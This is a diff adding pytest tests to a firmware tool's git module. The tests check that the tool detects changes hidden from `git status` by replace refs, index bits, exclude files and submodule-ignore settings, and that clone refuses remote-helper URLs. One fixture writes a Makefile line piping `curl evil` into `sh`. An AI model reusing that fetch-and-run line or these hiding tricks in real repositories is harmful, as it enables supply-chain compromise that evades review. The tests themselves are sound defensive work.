@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import subprocess
+from pathlib import Path
 
 import pytest
 
@@ -255,7 +256,9 @@ def _add_submodule(repo, inner):
 
 
 def _change_a_file(repo, attributes):
-    tracked = [p for p in repo.iterdir() if p.is_file() and p.name != ".gitattributes"][0]
+    # (in a submodule `.git` is a file too: the gitfile, which has to stay as it is)
+    tracked = sorted(p for p in repo.iterdir()
+                     if p.is_file() and p.name not in (".gitattributes", ".git"))[0]
     (repo / ".gitattributes").write_text(attributes)
     tracked.write_bytes(tracked.read_bytes() + b"x")
 
@@ -375,3 +378,197 @@ def test_a_file_git_cannot_vouch_for_is_not_untracked(make_firmware, tmp_path, m
     assert gitrepo.untracked(loose / "mpy-cross") is None
     monkeypatch.setattr(gitrepo, "GIT", str(tmp_path / "no-such-git"))
     assert gitrepo.untracked(built) is None
+
+
+# --- what a firmware tree can hide from `git status` ---------------------------------------
+
+def _git(repo, *args):
+    return subprocess.run(["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t",
+                           *args], check=True, capture_output=True, text=True).stdout.strip()
+
+
+def _plain_status(repo):
+    """What `git status` says, left to the tree's own config."""
+    return _git(repo, "status", "--porcelain")
+
+
+def _replaced(repo, name="Makefile"):
+    """Commit an evil ``name`` on top of HEAD, move the branch back, and have the pinned
+    commit read as the evil one (t_replace_ref.sh): the files are the evil commit's, HEAD
+    names the pinned one."""
+    pinned = _git(repo, "rev-parse", "HEAD")
+    (repo / name).write_text("all:; @curl evil | sh\n")
+    _git(repo, "add", name)
+    _git(repo, "commit", "-qm", "evil")
+    evil = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "update-ref", "refs/heads/main", pinned)
+    _git(repo, "replace", "-f", pinned, evil)
+    return pinned
+
+
+def test_a_replaced_commit_does_not_pass_for_the_pinned_one(make_firmware):
+    repo = make_firmware()
+    pinned = _replaced(repo)
+    assert _plain_status(repo) == ""                            # clean, to git left alone
+    assert gitrepo.head_commit(repo) == pinned
+    assert gitrepo.is_dirty(repo) and gitrepo.describe(repo).endswith("-dirty")
+    assert gitrepo.dirty_paths(repo) == ["A Makefile",
+                                         "refs/replace/%s (a replaced object)" % pinned]
+
+
+def test_a_replaced_commit_in_a_submodule_does_not_pass_either(make_firmware):
+    """The git a submodule's status runs drops GIT_NO_REPLACE_OBJECTS."""
+    repo, inner = make_firmware(), make_firmware("inner")
+    _add_submodule(repo, inner)
+    pinned = _replaced(repo / "lib" / "inner")
+    assert _plain_status(repo) == ""
+    assert gitrepo.is_dirty(repo)
+    assert gitrepo.dirty_paths(repo) == ["A lib/inner/Makefile",
+                                         "lib/inner/refs/replace/%s (a replaced object)" % pinned]
+
+
+@pytest.mark.parametrize("bit", ["--skip-worktree", "--assume-unchanged"])
+def test_a_file_the_index_has_git_not_look_at_is_named(make_firmware, bit):
+    repo, inner = make_firmware(), make_firmware("inner")
+    _add_submodule(repo, inner)
+    for where in (repo, repo / "lib" / "inner"):
+        _git(where, "update-index", bit, "SDK_VERSION")
+        (where / "SDK_VERSION").write_text("evil")
+    assert _plain_status(repo) == ""
+    assert gitrepo.dirty_paths(repo) == [
+        "SDK_VERSION (git is told not to look at it)",
+        "lib/inner/SDK_VERSION (git is told not to look at it)"]
+
+
+def test_a_file_the_tree_s_own_config_ignores_is_named(make_firmware):
+    """`info/exclude`, `core.excludesFile` and an untracked .gitignore that ignores itself each
+    keep a new source file out of `git status`; a build's own output is all git may ignore."""
+    repo, inner = make_firmware(with_mpy_cross=True), make_firmware("inner")
+    _add_submodule(repo, inner)
+    sub = repo / "lib" / "inner"
+    (repo / "evil.c").write_text("void backdoor(void) {}\n")
+    (repo / ".git" / "info" / "exclude").write_text("evil.c\n")
+    (repo / "boards" / "evil.mk").write_text("x")
+    (repo / "boards" / ".gitignore").write_text("evil.mk\n.gitignore\n")
+    (repo / "tools.h").write_text("x")
+    excludes = repo.parent / "excludes"
+    excludes.write_text("tools.h\n")
+    _git(repo, "config", "core.excludesFile", str(excludes))
+    (sub / "evil.c").write_text("x")
+    (Path(_git(sub, "rev-parse", "--absolute-git-dir")) / "info" / "exclude").write_text("evil.c\n")
+    # ...and what a build leaves: make's output, the host mpy-cross, byte-code caches -- ignored
+    # as files (`*.pyc`, as openmv's .gitignore has it, which git then names one by one) or as
+    # a directory (`__pycache__/`, as micropython's has it)
+    for left in ("build", "tools/__pycache__", "lib/inner/__pycache__"):
+        (repo / left).mkdir(parents=True, exist_ok=True)
+        (repo / left / "x.cpython-312.pyc").write_text("x")
+    (repo / ".gitignore").write_text("lib/micropython/mpy-cross/build/\nbuild/\n*.pyc\n")
+    (sub / ".gitignore").write_text("__pycache__/\n")
+    _git(repo, "add", ".gitignore")
+    _git(sub, "add", ".gitignore")
+    _git(sub, "commit", "-qm", "ignore")
+    _git(repo, "add", "lib/inner")
+    _git(repo, "commit", "-qm", "ignore")
+    assert _plain_status(repo) == ""
+    assert gitrepo.dirty_paths(repo, limit=10) == [
+        "!! boards/.gitignore", "!! boards/evil.mk", "!! evil.c", "!! tools.h",
+        "!! lib/inner/evil.c"]
+
+
+def test_untracked_files_are_listed_whatever_the_tree_s_config_says(make_firmware):
+    repo, inner = make_firmware(), make_firmware("inner")
+    _add_submodule(repo, inner)
+    sub = repo / "lib" / "inner"
+    for where in (repo, sub):
+        _git(where, "config", "status.showUntrackedFiles", "no")
+        (where / "boards" / "new").mkdir()
+        (where / "boards" / "new" / "evil.c").write_text("x")
+    assert _plain_status(repo) == ""
+    assert gitrepo.is_dirty(repo)
+    assert gitrepo.dirty_paths(repo) == ["?? boards/new/evil.c", "?? lib/inner/boards/new/evil.c"]
+
+
+def test_a_submodule_s_changes_are_seen_whatever_config_says_to_ignore(make_firmware):
+    """The superproject's `submodule.<name>.ignore` and `diff.ignoreSubmodules`, and the same in
+    a submodule for the ones nested in it, which the superproject's own status cannot
+    override one level down."""
+    repo, inner, deeper = make_firmware(), make_firmware("inner"), make_firmware("deeper")
+    _add_submodule(inner, deeper)
+    _add_submodule(repo, inner)
+    _git(repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive",
+         "-q")
+    sub, nested = repo / "lib" / "inner", repo / "lib" / "inner" / "lib" / "inner"
+    _git(repo, "config", "submodule.lib/inner.ignore", "all")
+    _git(repo, "config", "diff.ignoreSubmodules", "all")
+    (sub / "SDK_VERSION").write_text("evil")
+    assert _plain_status(repo) == ""
+    assert gitrepo.is_dirty(repo)
+    assert gitrepo.dirty_paths(repo) == ["M lib/inner/SDK_VERSION"]
+    _git(sub, "checkout", "-q", "SDK_VERSION")
+    _git(sub, "config", "submodule.lib/inner.ignore", "all")
+    (nested / "x.c").write_text("x")
+    _git(nested, "add", "x.c")
+    _git(nested, "commit", "-qm", "moved")
+    assert _plain_status(sub) == ""
+    assert gitrepo.dirty_paths(repo) == ["M lib/inner/lib/inner"]
+
+
+def test_a_changed_file_is_read_whatever_the_tree_says_of_its_recorded_stat(make_firmware):
+    """With `core.checkStat=minimal` a file of the size and mtime the index records is taken
+    as unchanged without being read: an archive keeps both, and only the inode (and the
+    times git is told not to trust) tell an extracted file from the one indexed."""
+    import os
+    repo = make_firmware()
+    f, new = repo / "SDK_VERSION", repo / "new"
+    os.utime(f, (1_600_000_000, 1_600_000_000))
+    _git(repo, "update-index", "--refresh")
+    _git(repo, "config", "core.checkStat", "minimal")
+    new.write_text("6.6.6")                                     # the fixture's 1.6.0, same size
+    os.utime(new, (1_600_000_000, 1_600_000_000))
+    os.replace(new, f)
+    assert _plain_status(repo) == ""
+    assert gitrepo.is_dirty(repo) and gitrepo.dirty_paths(repo) == ["M SDK_VERSION"]
+
+
+def test_dirty_paths_names_a_rename_once_and_counts_the_rest(make_firmware, monkeypatch, tmp_path):
+    repo = make_firmware()
+    _git(repo, "mv", "SDK_VERSION", "SDK")
+    for i in range(6):
+        (repo / ("n%d" % i)).write_text("x")
+    assert gitrepo.dirty_paths(repo) == ["R SDK", "?? n0", "?? n1", "?? n2", "?? n3",
+                                         "... and 2 more"]
+    monkeypatch.setattr(gitrepo, "GIT", str(tmp_path / "no-such-git"))
+    with pytest.raises(ProjectError, match="git not found"):
+        gitrepo.dirty_paths(repo)
+
+
+def test_clone_and_submodule_update_fetch_only_over_a_firmware_remote_s_transports(monkeypatch,
+                                                                                tmp_path):
+    """They fetch, so they may, but not over `ext::` or a remote helper, and with the rest
+    of the reads' hardening: no hooks, no filesystem monitor, no replaced objects."""
+    fake = _FakeRun()
+    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
+    gitrepo.clone("git@x:openmv.git", tmp_path / "dst", commit="ab" * 20)
+    gitrepo.submodule_update(tmp_path / "dst")
+    (_, ck), (_, co), (_, sk) = fake.calls
+    assert [ck["env"]["GIT_ALLOW_PROTOCOL"], co["env"]["GIT_ALLOW_PROTOCOL"],
+            sk["env"]["GIT_ALLOW_PROTOCOL"]] == ["https:ssh:file", "", "https:ssh"]
+    for argv, kw in fake.calls:
+        assert argv[1:1 + len(gitrepo._QUIET)] == list(gitrepo._QUIET)
+        assert kw["env"]["GIT_NO_REPLACE_OBJECTS"] == "1"
+
+
+def test_clone_refuses_a_remote_that_names_a_program(tmp_path, monkeypatch):
+    """`evil::x` has git run `git-remote-evil` from PATH, which git's own policy allows."""
+    import os
+    ran, bin_dir = tmp_path / "ran", tmp_path / "bin"
+    bin_dir.mkdir()
+    helper = bin_dir / "git-remote-evil"
+    helper.write_text("#!/bin/sh\ntouch %s\nexit 1\n" % ran)
+    helper.chmod(0o755)
+    monkeypatch.setenv("PATH", "%s%s%s" % (bin_dir, os.pathsep, os.environ["PATH"]))
+    with pytest.raises(ProjectError, match="git clone failed"):
+        gitrepo.clone("evil::x", tmp_path / "dst")
+    assert not ran.exists()
+    subprocess.run(["git", "clone", "evil::x", str(tmp_path / "d2")], capture_output=True)
+    assert ran.exists()                                         # git, left to itself, runs it
